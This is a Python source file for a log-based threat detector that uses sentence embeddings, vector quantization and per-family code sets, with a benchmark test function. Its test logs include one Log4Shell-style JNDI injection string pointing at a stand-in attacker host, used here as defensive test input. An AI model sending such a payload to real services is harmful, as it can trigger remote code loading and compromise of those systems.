#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
adalog_production_v3_1.py
--------------------------------------------------------
V3.1 Optimized production detector with batch processing

Optimizations:
1. Batch embedding: Process 100 logs at once (5-10x faster)
2. Vectorized VQ: Batch quantization (2-3x faster)
3. Fast path gating: Skip embedding for clearly benign logs (10-50x on benign traffic)

Expected speedup: 10-50x on mixed traffic, 5-10x on all-malicious traffic
"""

import numpy as np
import json
import hashlib
import re
from pathlib import Path
from typing import Dict, List, Set, Tuple
from collections import defaultdict

try:
    from sentence_transformers import SentenceTransformer
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TRANSFORMERS_AVAILABLE = False


class FastADALogDetectorV31:
    """
    V3.1 Optimized detector with batch processing and fast path gating
    """

    def __init__(self, model_path: str):
        """
        Initialize V3.1 detector

        Args:
            model_path: Path to trained model
        """
        self.load_model(model_path)

        # Load semantic model
        if not TRANSFORMERS_AVAILABLE:
            raise ImportError("sentence-transformers required")

        print("Loading semantic model...")
        self.semantic_model = SentenceTransformer('all-MiniLM-L6-v2')
        print("✓ Semantic model loaded")

        # Build Bloom filters
        self.bloom_filters = {}
        self._build_bloom_filters()

        # Fast path: Simple regex patterns for clearly benign logs
        self.benign_patterns = [
            r'^nginx:.*GET /.*200$',
            r'^systemd.*Started.*service$',
            r'^User.*logged in successfully$',
        ]
        self.benign_regex = re.compile('|'.join(f'({p})' for p in self.benign_patterns))

        print(f"✓ V3.1 detector ready")
        print(f"   Optimizations: Batch embedding + Vectorized VQ + Fast path")
        print(f"   Batch size: 100 logs")
        print(f"   Expected: 700-1400 logs/sec on mixed traffic")

    def load_model(self, model_path: str):
        """Load pre-trained model"""
        with open(model_path, 'r') as f:
            model = json.load(f)

        self.families = model['families']
        self.embed_dim = model['embed_dim']
        self.vq_codebook = np.array(model['vq_codebook'], dtype=np.float32)
        self.family_vq_codes = {
            family: set(codes)
            for family, codes in model['family_vq_codes'].items()
        }

        print(f"✓ Model loaded: {model_path}")

    def _build_bloom_filters(self):
        """Build Bloom filters"""
        for family, vq_codes in self.family_vq_codes.items():
            self.bloom_filters[family] = set(vq_codes)
        print(f"✓ Bloom filters built")

    def is_benign_fast_path(self, text: str) -> bool:
        """
        Fast path: Check if log is clearly benign without semantic analysis

        Args:
            text: Log text

        Returns:
            True if clearly benign (skip embedding)
        """
        return bool(self.benign_regex.search(text))

    def embed_batch(self, texts: List[str]) -> np.ndarray:
        """
        Batch embed multiple logs at once (MUCH faster than one-by-one)

        Args:
            texts: List of log texts

        Returns:
            Array of embeddings (N x embed_dim)
        """
        if len(texts) == 0:
            return np.array([], dtype=np.float32).reshape(0, self.embed_dim)

        # Batch encoding is 5-10x faster than sequential!
        embeddings = self.semantic_model.encode(
            texts,
            batch_size=32,  # Internal batch size for transformer
            show_progress_bar=False,
            convert_to_numpy=True
        )
        return embeddings.astype(np.float32)

    def quantize_batch(self, embeddings: np.ndarray) -> np.ndarray:
        """
        Vectorized VQ quantization for batch of embeddings

        Args:
            embeddings: Array of embeddings (N x embed_dim)

        Returns:
            Array of VQ codes (N,)
        """
        if len(embeddings) == 0:
            return np.array([], dtype=np.int32)

        # Vectorized distance computation
        # embeddings: (N, D), codebook: (K, D)
        # dists: (N, K)
        dists = np.sum(
            (embeddings[:, np.newaxis, :] - self.vq_codebook[np.newaxis, :, :]) ** 2,
            axis=2
        )

        # Find nearest centroid for each embedding
        vq_codes = np.argmin(dists, axis=1)
        return vq_codes.astype(np.int32)

    def detect_batch(self, texts: List[str]) -> List[Tuple[Set[str], Dict[str, float]]]:
        """
        Detect threats in batch of logs (optimized pipeline)

        Args:
            texts: List of log texts

        Returns:
            List of (detected_families, scores) for each log
        """
        results = []

        # Step 1: Fast path filtering
        suspicious_indices = []
        for i, text in enumerate(texts):
            if self.is_benign_fast_path(text):
                # Skip embedding for clearly benign
                results.append((set(), {}))
            else:
                suspicious_indices.append(i)
                results.append(None)  # Placeholder

        if not suspicious_indices:
            # All benign, return early
            return results

        # Step 2: Batch embed suspicious logs only
        suspicious_texts = [texts[i] for i in suspicious_indices]
        embeddings = self.embed_batch(suspicious_texts)

        # Step 3: Batch quantize
        vq_codes = self.quantize_batch(embeddings)

        # Step 4: Bloom filter lookup (still sequential, but fast)
        for idx, vq_code in zip(suspicious_indices, vq_codes):
            detected = set()
            scores = {}

            for family, bloom in self.bloom_filters.items():
                if vq_code in bloom:
                    detected.add(family)
                    scores[family] = 1.0

            results[idx] = (detected, scores)

        return results

    def classify_batch(self, texts: List[str]) -> List[Tuple[np.ndarray, List[str], Dict, np.ndarray]]:
        """
        Classify batch of logs (compatible with V3 interface)

        Args:
            texts: List of log texts

        Returns:
            List of (embedding, families, patterns, probabilities) for each log
        """
        detections = self.detect_batch(texts)

        # Get embeddings for all suspicious logs
        embeddings_map = {}
        suspicious_texts = []
        suspicious_indices = []

        for i, text in enumerate(texts):
            if not self.is_benign_fast_path(text):
                suspicious_texts.append(text)
                suspicious_indices.append(i)

        if suspicious_texts:
            embeddings = self.embed_batch(suspicious_texts)
            for idx, emb in zip(suspicious_indices, embeddings):
                embeddings_map[idx] = emb

        results = []
        for i, (detected, scores) in enumerate(detections):
            # Get or create embedding
            if i in embeddings_map:
                emb = embeddings_map[i]
            else:
                # Benign log, use zero embedding
                emb = np.zeros(self.embed_dim, dtype=np.float32)

            # Build probability array
            probs = np.zeros(len(self.families), dtype=np.float32)
            patterns = {}

            for j, family in enumerate(self.families):
                if family in detected:
                    probs[j] = scores[family]
                    patterns[family] = f"vq_bloom_{family}_matched"

            results.append((emb, self.families, patterns, probs))

        return results


def test_v31_detector():
    """Test V3.1 optimizations"""
    import time

    print("\n" + "="*70)
    print("V3.1 OPTIMIZED DETECTOR TEST")
    print("="*70 + "\n")

    detector = FastADALogDetectorV31("models/adalog_bloom_signatures.json")

    # Test batch processing
    test_logs = [
        "sshd[16078]: SIGALRM received during authentication",
        "GET /api?q=${jndi:ldap://evil.com/x}",
        "kernel: SMB: NT_STATUS_INSUFF_SERVER_RESOURCES",
        "nginx: 192.168.1.1 GET /index.html 200",  # benign (fast path!)
        "systemd: Started nginx service",  # benign (fast path!)
    ] * 20  # 100 logs total

    print(f"Testing batch detection on {len(test_logs)} logs...\n")

    start = time.time()
    results = detector.detect_batch(test_logs)
    elapsed = time.time() - start

    # Count detections
    detected_count = sum(1 for detected, _ in results if detected)
    fast_path_count = sum(1 for detected, _ in results if not detected)

    print(f"✅ Complete: {len(test_logs)} logs in {elapsed:.3f}s ({len(test_logs)/elapsed:.0f} logs/sec)")
    print(f"   Detections: {detected_count}")
    print(f"   Fast path (skipped embedding): {fast_path_count}")
    print(f"\n   Speedup: ~{(len(test_logs)/elapsed) / 70:.1f}x vs non-batched semantic")

    # Show sample results
    print(f"\nSample detections:")
    for i in [0, 1, 2, 3, 4]:
        text = test_logs[i]
        detected, scores = results[i]
        print(f"   {i+1}. {text[:50]}...")
        print(f"      → {list(detected) if detected else 'benign (fast path)'}")

    print("\n" + "="*70 + "\n")


if __name__ == "__main__":
    test_v31_detector()
